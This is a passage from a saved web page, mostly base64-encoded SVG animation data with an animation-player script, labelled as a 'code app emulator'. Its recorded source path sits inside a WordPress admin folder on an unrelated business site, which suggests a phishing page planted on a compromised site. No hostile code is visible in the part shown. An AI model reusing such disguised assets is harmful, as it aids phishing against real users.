joiY29ybmVyIn0sInQiOnsieCI6LTEwLjIsInkiOi0xMH19LCJrZXlzIjp7InMiOlt7InQiOjEwMDAsInYiOnsieCI6MS4wOTM3NSwieSI6MS4wOTM3NX0sImUiOlswLDAsMC41OCwxXX0seyJ0Ijo2ODAwLCJ2Ijp7IngiOjEuMDkzNzUsInkiOjEuMDkzNzV9LCJlIjpbMCwwLDAuNTgsMV19LHsidCI6OTAwMCwidiI6eyJ4IjoxLjA5Mzc1MSwieSI6MS4wOTM3NTF9LCJlIjpbMC40MiwwLDEsMV19XX19LCJvcGFjaXR5IjpbeyJ0IjoxMDAwLCJ2IjowLCJlIjpbMSwwXX0seyJ0Ijo2NzkwLCJ2IjoxfSx7InQiOjY4MDAsInYiOjB9LHsidCI6ODk5MCwidiI6MX1dfX0sInMiOiJNRExBMU5HSTJOV1E1Wk9sSmlNR0ZrT1dOaEdabUUwWVdGT1lUbERaTldRM05UWmpURFdabU5tSTJZalppTktqYzFaRk01Wm1FMEVZV1JoTURsbFlXWkNoTkdGaFlUazFaRE9jMU5tTTJOMFUxWkZFbGhORk5YWVdaaERNR0ZrT1dOaFptRUkwWVdGaE9XRmxOV0dRM05UWmlVRFkzTktXUmhNV0UwWVRkaElOelZrTnpVMll6WUszTldSSk9XTmhOMlVGbVlUQmhaR0U1T0JXTmhabEJoTURWa01OelZoTVRsallUZENoWldFd05qZE1OV1ZSaFpXRmlZVEJoTVlEbG1OV1JNTnpVMlFZMkk0In1dLCJvcHRpb25zIjoiTURKQXhNRGd5TWprM1lHVGRpUXpZNE56azNUWWpJNU5ERXlPVGNZek56WkROamcyWWtHZ3lPVGcwIn0sJ19fU1ZHQVRPUl9QTEFZRVJfXycsd2luZG93KV1dPjwvc2NyaXB0Pjwvc3ZnPgo=">
                        <img alt="code-app-emulator" class="code-app-emulator" data-savepage-currentsrc="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/media/code-app-slider-emulator.svg" data-savepage-src="./media/code-app-slider-emulator.svg" src="data:image/svg+xml;base64,PHN2ZyBpZD0iZXRaR0gyUXo5dzAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgMTgwIDE2MCIgc2hhcGUtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iIHRleHQtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iPjxwYXRoIGlkPSJldFpHSDJRejl3MDIiIGQ9Ik04My44NzM2ODQsMEwxMi4xMjYzMTYsMEM1LjQ1Njg0MiwwLDAsNS40LDAsMTJMMCwxNDhDMCwxNTQuNiw1LjQ1Njg0MiwxNjAsMTIuMTI2MzE2LDE2MEw4My44NzM2ODQsMTYwQzkwLjU0MzE1OCwxNjAsOTYsMTU0LjYsOTYsMTQ4TDk2LDEyQzk2LDUuNCw5MC41NDMxNTgsMCw4My44NzM2ODQsMEw4My44NzM2ODQsMFoiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNDIgMCkiIGZpbGw9InJnYigxNDIsMTkyLDI1MCkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PHBhdGggaWQ9ImV0WkdIMlF6OXcwMyIgZD0iTTc4LjkxNzY0NywwQzgyLjg2MzUyOSwwLDg2LDMuMSw4Niw3TDg2LDE0M0M4NiwxNDYuOCw4Mi44NjM1MjksMTUwLDc4LjkxNzY0NywxNTBMNy4wODIzNTMsMTUwQzMuMjM3NjQ3LDE1MCwwLDE0Ni44LDAsMTQzTDAsN0MwLDMuMSwzLjIzNzY0NywwLDcuMDgyMzUzLDBMNzguOTE3NjQ3LDAiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNDcgNSkiIGZpbGw9InJnYigyMDAsMjI0LDI1MykiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxLjE3NjQ3MSIvPjxnIGlkPSJldFpHSDJRejl3MDQiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMCAtMTApIj48cmVjdCBpZD0iZXRaR0gyUXo5dzA1IiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgODAuMDAwMDAxIDU1LjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDYiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiA1NS4wMDAwMDEgNTUuMTAxMDcxKSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwNyIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDgwLjAwMDAxOCAzMC4xMDEwNzEpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzA4IiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgNTUuMDAwMDE4IDMwLjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDkiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiAxMDUuMDAwMDAxIDU1LjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDEwIiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgODAuMDAwMDAxIDEwNC44OTg5MjkpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzAxMSIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDU1LjAwMDAwMSAxMDQuODk4OTI5KSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMTIiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiAxMDUuMDAwMDAxIDEwNC44OTg5MjkpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzAxMyIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDEwNS4wMDAwMDEgODAuMTAxMDcxKSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMTQiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiA1NS4wMDAwMDEgODAuMTAxMDcxKSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMTUiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiAxMDUuMDAwMDAxIDMwLjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDE2IiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgODAuMDAwMDAxIDEyOS44OTg5MjkpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzAxNyIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDU1LjAwMDAwMSAxMjkuODk4OTI5KSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PC9nPjxnIGlkPSJldFpHSDJRejl3MDE4IiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDAgLTEwKSIgY2xpcC1wYXRoPSJ1cmwoI2V0WkdIMlF6OXcwMjQpIj48ZyBpZD0iZXRaR0gyUXo5dzAxOSIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSAwLjAwMDAwMSAwLjAwMDAwMSkiPjxyZWN0IGlkPSJldFpHSDJRejl3MDIwIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSA4MCA4MCkiIGZpbGw9InJnYigwLDk2LDIzMCkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMjEiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiA4MC4wMDAwMDEgODApIiBmaWxsPSJyZ2IoMCw5NiwyMzApIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxwYXRoIGlkPSJldFpHSDJRejl3MDIzIiBkPSJNNyw5LjhDOCw5LjgsOC44LDksOC44LDhDOC44LDcsOCw2LjIsNyw2LjJDNiw2LjIsNS4yLDcsNS4yLDhDNS4yLDksNiw5LjgsNyw5LjhaTTcsMTAuNUM1LjMsMTAuNSw0LDExLjUsMy44LDEzLjhMMTAuMiwxMy44QzEwLDExLjUsOC43LDEwLjUsNywxMC41Wk0xMi4zLDYuMkwxMSw2LjJMMTEsMTMuOEwxMi4yLDEzLjhDMTUuMywxMy44LDE2LjYsMTIuMSwxNi42LDEwQzE2LjYsNy45LDE1LjMsNi4yLDEyLjMsNi4yWiIgdHJhbnNmb3JtPSJtYXRyaXgoMS4wOTM3NSAwIDAgMS4wOTM3NSA3OC44NDM3NSA3OS4wNjI1KSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiLz48L2c+PGNsaXBQYXRoIGlkPSJldFpHSDJRejl3MDI0Ij48cGF0aCBpZD0iZXRaR0gyUXo5dzAyNSIgZD0iTTgzLjg3MzY4NCwwTDEyLjEyNjMxNiwwQzUuNDU2ODQyLDAsMCw1LjQsMCwxMkwwLDE0OEMwLDE1NC42LDUuNDU2ODQyLDE2MCwxMi4xMjYzMTYsMTYwTDgzLjg3MzY4NCwxNjBDOTAuNTQzMTU4LDE2MCw5NiwxNTQuNiw5NiwxNDhMOTYsMTJDOTYsNS40LDkwLjU0MzE1OCwwLDgzLjg3MzY4NCwwTDgzLjg3MzY4NCwwWiIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSA0MiAxMCkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9jbGlwUGF0aD48L2c+PHBhdGggaWQ9ImV0WkdIMlF6OXcwMjYiIGQ9Ik03OC45MTc2NDcsMEM4Mi44NjM1MjksMCw4NiwzLjEsODYsN0w4NiwxNDNDODYsMTQ2LjgsODIuODYzNTI5LDE1MCw3OC45MTc2NDcsMTUwTDcuMDgyMzUzLDE1MEMzLjIzNzY0NywxNTAsMCwxNDYuOCwwLDE0M0wwLDdDMCwzLjEsMy4yMzc2NDcsMCw3LjA4MjM1MywwTDc4LjkxNzY0NywwIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDQ3IDUpIiBvcGFjaXR5PSIwIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMS4xNzY0NzEiLz48cGF0aCBpZD0iZXRaR0gyUXo5dzAyNyIgZD0iTTcuNDExMDY0LDEwLjI2MjU4M0M4LjUzOTUyMSwxMC4yNjI1ODMsOS40NDIyODcsOS4zNTk3ODcsOS40NDIyODcsOC4yMzEyOTJDOS40NDIyODcsNy4xMDI3OTYsOC41Mzk1MjEsNi4yLDcuNDExMDY0LDYuMkM2LjI4MjYwNiw2LjIsNS4zNzk4NCw3LjEwMjc5Niw1LjM3OTg0LDguMjMxMjkyQzUuMzc5ODQsOS4zNTk3ODcsNi4yODI2MDYsMTAuMjYyNTgzLDcuNDExMDY0LDEwLjI2MjU4M1pNNy40MTEwNjQsMTEuMDUyNTNDNS40OTI2ODYsMTEuMDUyNTMsNC4wMjU2OTEsMTIuMTgxMDI1LDMuOCwxNC43NzY1NjRMMTEuMDIyMTI4LDE0Ljc3NjU2NEMxMC43OTY0MzYsMTIuMTgxMDI1LDkuMzI5NDQxLDExLjA1MjUzLDcuNDExMDY0LDExLjA1MjUzWk0xMy4zOTE4ODgsNi4yTDExLjkyNDg5NCw2LjJMMTEuOTI0ODk0LDE0Ljc3NjU2NEwxMy4yNzkwNDMsMTQuNzc2NTY0QzE2Ljc3NzI2MSwxNC43NzY1NjQsMTguMjQ0MjU1LDEyLjg1ODEyMiwxOC4yNDQyNTUsMTAuNDg4MjgyQzE4LjI0NDI1NSw4LjExODQ0MiwxNi43NzcyNjEsNi4yLDEzLjM5MTg4OCw2LjJaIiB0cmFuc2Zvcm09Im1hdHJpeCgzLjEzNDExOCAwIDAgMy4xMzQxMjIgNTUuNDU1MzUxIDExLjgwNjUwNykiIGZpbGw9InJnYigwLDk2LDIzMCkiIGZpbGwtb3BhY2l0eT0iMCIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiLz48cGF0aCBpZD0iZXRaR0gyUXo5dzAyOCIgZD0iTTEwLDBMNTAsMEM1NS41LDAsNjAsNC41LDYwLDEwTDYwLDEwQzYwLDE1LjUsNTUuNSwyMCw1MCwyMEwxMCwyMEM0LjUsMjAsMCwxNS41LDAsMTBMMCwxMEMwLDQuNSw0LjUsMCwxMCwwWiIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSA2MCAxMjApIiBvcGFjaXR5PSIwIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGZpbGw9InJnYigwLDk2LDIzMCkiIGZpbGwtcnVsZT0iZXZlbm9kZCIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiLz48ZyBpZD0iZXRaR0gyUXo5dzAyOSIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSAwIC0xMCkiIGNsaXAtcGF0aD0idXJsKCNldFpHSDJRejl3MDMxKSI+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMzAiIHdpZHRoPSI3LjkzOTUxMiIgaGVpZ2h0PSIzMCIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgtNy41NTcxNCAwIDAgMSA3MCAxMjUpIiBvcGFjaXR5PSIwIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxjbGlwUGF0aCBpZD0iZXRaR0gyUXo5dzAzMSI+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMzIiIHdpZHRoPSI2OSIgaGVpZ2h0PSIzMyIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDU1IDEyNCkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PC9jbGlwUGF0aD48L2c+PGcgaWQ9ImV0WkdIMlF6OXcwMzMiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMCAtMTApIiBjbGlwLXBhdGg9InVybCgjZXRaR0gyUXo5dzAzNSkiPjxwYXRoIGlkPSJldFpHSDJRejl3MDM0IiBkPSJNMTAsMEw1MCwwQzU1LjUsMCw2MCw0LjUsNjAsMTBMNjAsMTBDNjAsMTUuNSw1NS41LDIwLDUwLDIwTDEwLDIwQzQuNSwyMCwwLDE1LjUsMCwxMEwwLDEwQzAsNC41LDQuNSwwLDEwLDBaIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDIwIDEzMCkiIG9wYWNpdHk9IjAiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0icmdiKDIwMCwyMjQsMjUzKSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIvPjxjbGlwUGF0aCBpZD0iZXRaR0gyUXo5dzAzNSI+PHBhdGggaWQ9ImV0WkdIMlF6OXcwMzYiIGQ9Ik0xMCwwTDUwLDBDNTUuNSwwLDYwLDQuNSw2MCwxMEw2MCwxMEM2MCwxNS41LDU1LjUsMjAsNTAsMjBMMTAsMjBDNC41LDIwLDAsMTUuNSwwLDEwTDAsMTBDMCw0LjUsNC41LDAsMTAsMFoiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNjAgMTMwKSIgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9jbGlwUGF0aD48L2c+PGcgaWQ9ImV0WkdIMlF6OXcwMzciIHRyYW5zZm9ybT0ibWF0cml4KDEuMDkzNzUgMCAwIDEuMDkzNzUgNzguODQzNzUgNjkuMDYyNSkiIG9wYWNpdHk9IjAiPjxnIGlkPSJldFpHSDJRejl3MDM4Ij48cGF0aCBpZD0iZXRaR0gyUXo5dzAzOSIgZD0iTTcsOS44QzgsOS44LDguOCw5LDguOCw4QzguOCw3LDgsNi4yLDcsNi4yQzYsNi4yLDUuMiw3LDUuMiw4QzUuMiw5LDYsOS44LDcsOS44Wk03LDEwLjVDNS4zLDEwLjUsNCwxMS41LDMuOCwxMy44TDEwLjIsMTMuOEMxMCwxMS41LDguNywxMC41LDcsMTAuNVpNMTIuMyw2LjJMMTEsNi4yTDExLDEzLjhMMTIuMiwxMy44QzE1LjMsMTMuOCwxNi42LDEyLjEsMTYuNiwxMEMxNi42LDcuOSwxNS4zLDYuMiwxMi4zLDYuMloiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9nPjwvZz48c2NyaXB0PjwhW0NEQVRBWyFmdW5jdGlvbih0LG4peyJvYmplY3QiPT10eXBlb2YgZXhwb3J0cyYmInVuZGVmaW5lZCIhPXR5cGVvZiBtb2R1bGU/bW9kdWxlLmV4cG9ydHM9bigpOiJmdW5jdGlvbiI9PXR5cGVvZiBkZWZpbmUmJmRlZmluZS5hbWQ/ZGVmaW5lKG4pOigodD0idW5kZWZpbmVkIiE9dHlwZW9mIGdsb2JhbFRoaXM/Z2xvYmFsVGhpczp0fHxzZWxmKS5fX1NWR0FUT1JfUExBWUVSX189dC5fX1NWR0FUT1JfUExBWUVSX198fHt9LHQuX19TVkdBVE9SX1BMQVlFUl9fWyI5MWM4MGQ3NyJdPW4oKSl9KHRoaXMsKGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHQodCxuKXt2YXIgZT1PYmplY3Qua2V5cyh0KTtpZihPYmplY3QuZ2V0T3duUHJvcGVydHlTeW1ib2xzKXt2YXIgcj1PYmplY3QuZ2V0T3duUHJvcGVydHlTeW1ib2xzKHQpO24mJihyPXIuZmlsdGVyKChmdW5jdGlvbihuKXtyZXR1cm4gT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcih0LG4pLmVudW1lcmFibGV9KSkpLGUucHVzaC5hcHBseShlLHIpfXJldHVybiBlfWZ1bmN0aW9uIG4obil7Zm9yKHZhciBlPTE7ZTxhcmd1bWVudHMubGVuZ3RoO2UrKyl7dmFyIHI9bnVsbCE9YXJndW1lbnRzW2VdP2FyZ3VtZW50c1tlXTp7fTtlJTI/dChPYmplY3QociksITApLmZvckVhY2goKGZ1bmN0aW9uKHQpe28obix0LHJbdF0pfSkpOk9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3JzP09iamVjdC5kZWZpbmVQcm9wZXJ0aWVzKG4sT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcnMocikpOnQoT2JqZWN0KHIpKS5mb3JFYWNoKChmdW5jdGlvbih0KXtPYmplY3QuZGVmaW5lUHJvcGVydHkobix0LE9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3Iocix0KSl9KSl9cmV0dXJuIG59ZnVuY3Rpb24gZSh0KXtyZXR1cm4oZT0iZnVuY3Rpb24iPT10eXBlb2YgU3ltYm9sJiYic3ltYm9sIj09dHlwZW9mIFN5bWJvbC5pdGVyYXRvcj9mdW5jdGlvbih0KXtyZXR1cm4gdHlwZW9mIHR9OmZ1bmN0aW9uKHQpe3JldHVybiB0JiYiZnVuY3Rpb24iPT10eXBlb2YgU3ltYm9sJiZ0LmNvbnN0cnVjdG9yPT09U3ltYm9sJiZ0IT09U3ltYm9sLnByb3RvdHlwZT8ic3ltYm9sIjp0eXBlb2YgdH0pKHQpfWZ1bmN0aW9uIHIodCxuKXtpZighKHQgaW5zdGFuY2VvZiBuKSl0aHJvdyBuZXcgVHlwZUVycm9yKCJDYW5ub3QgY2FsbCBhIGNsYXNzIGFzIGEgZnVuY3Rpb24iKX1mdW5jdGlvbiBpKHQsbil7Zm9yKHZhciBlPTA7ZTxuLmxlbmd0aDtlKyspe3ZhciByPW5bZV07ci5lbnVtZXJhYmxlPXIuZW51bWVyYWJsZXx8ITEsci5jb25maWd1cmFibGU9ITAsInZhbHVlImluIHImJihyLndyaXRhYmxlPSEwKSxPYmplY3QuZGVmaW5lUHJvcGVydHkodCxyLmtleSxyKX19ZnVuY3Rpb24gdSh0LG4sZSl7cmV0dXJuIG4mJmkodC5wcm90b3R5cGUsbiksZSYmaSh0LGUpLHR9ZnVuY3Rpb24gbyh0LG4sZSl7cmV0dXJuIG4gaW4gdD9PYmplY3QuZGVmaW5lUHJvcGVydHkodCxuLHt2YWx1ZTplLGVudW1lcmFibGU6ITAsY29uZmlndXJhYmxlOiEwLHdyaXRhYmxlOiEwfSk6dFtuXT1lLHR9ZnVuY3Rpb24gYSh0KXtyZXR1cm4oYT1PYmplY3Quc2V0UHJvdG90eXBlT2Y/T2JqZWN0LmdldFByb3RvdHlwZU9mOmZ1bmN0aW9uKHQpe3JldHVybiB0Ll9fcHJvdG9fX3x8T2JqZWN0LmdldFByb3RvdHlwZU9mKHQpfSkodCl9ZnVuY3Rpb24gbCh0LG4pe3JldHVybihsPU9iamVjdC5zZXRQcm90b3R5cGVPZnx8ZnVuY3Rpb24odCxuKXtyZXR1cm4gdC5fX3Byb3RvX189bix0fSkodCxuKX1mdW5jdGlvbiBzKCl7aWYoInVuZGVmaW5lZCI9PXR5cGVvZiBSZWZsZWN0fHwhUmVmbGVjdC5jb25zdHJ1Y3QpcmV0dXJuITE7aWYoUmVmbGVjdC5jb25zdHJ1Y3Quc2hhbSlyZXR1cm4hMTtpZigiZnVuY3Rpb24iPT10eXBlb2YgUHJveHkpcmV0dXJuITA7dHJ5e3JldHVybiBCb29sZWFuLnByb3RvdHlwZS52YWx1ZU9mLmNhbGwoUmVmbGVjdC5jb25zdHJ1Y3QoQm9vbGVhbixbXSwoZnVuY3Rpb24oKXt9KSkpLCEwfWNhdGNoKHQpe3JldHVybiExfX1mdW5jdGlvbiBmKHQsbixlKXtyZXR1cm4oZj1zKCk/UmVmbGVjdC5jb25zdHJ1Y3Q6ZnVuY3Rpb24odCxuLGUpe3ZhciByPVtudWxsXTtyLnB1c2guYXBwbHkocixuKTt2YXIgaT1uZXcoRnVuY3Rpb24uYmluZC5hcHBseSh0LHIpKTtyZXR1cm4gZSYmbChpLGUucHJvdG90eXBlKSxpfSkuYXBwbHkobnVsbCxhcmd1bWVudHMpfWZ1bmN0aW9uIGModCxuKXtpZihuJiYoIm9iamVjdCI9PXR5cGVvZiBufHwiZnVuY3Rpb24iPT10eXBlb2YgbikpcmV0dXJuIG47aWYodm9pZCAwIT09bil0aHJvdyBuZXcgVHlwZUVycm9yKCJEZXJpdmVkIGNvbnN0cnVjdG9ycyBtYXkgb25seSByZXR1cm4gb2JqZWN0IG9yIHVuZGVmaW5lZCIpO3JldHVybiBmdW5jdGlvbih0KXtpZih2b2lkIDA9PT10KXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIHR9KHQpfWZ1bmN0aW9uIGgodCxuLGUpe3JldHVybihoPSJ1bmRlZmluZWQiIT10eXBlb2YgUmVmbGVjdCYmUmVmbGVjdC5nZXQ/UmVmbGVjdC5nZXQ6ZnVuY3Rpb24odCxuLGUpe3ZhciByPWZ1bmN0aW9uKHQsbil7Zm9yKDshT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKHQsbikmJm51bGwhPT0odD1hKHQpKTspO3JldHVybiB0fSh0LG4pO2lmKHIpe3ZhciBpPU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IocixuKTtyZXR1cm4gaS5nZXQ/aS5nZXQuY2FsbChlKTppLnZhbHVlfX0pKHQsbixlfHx0KX1mdW5jdGlvbiB2KHQpe3JldHVybiBmdW5jdGlvbih0KXtpZihBcnJheS5pc0FycmF5KHQpKXJldHVybiBkKHQpfSh0KXx8ZnVuY3Rpb24odCl7aWYoInVuZGVmaW5lZCIhPXR5cGVvZiBTeW1ib2wmJm51bGwhPXRbU3ltYm9sLml0ZXJhdG9yXXx8bnVsbCE9dFsiQEBpdGVyYXRvciJdKXJldHVybiBBcnJheS5mcm9tKHQpfSh0KXx8ZnVuY3Rpb24odCxuKXtpZighdClyZXR1cm47aWYoInN0cmluZyI9PXR5cGVvZiB0KXJldHVybiBkKHQsbik7dmFyIGU9T2JqZWN0LnByb3RvdHlwZS50b1N0cml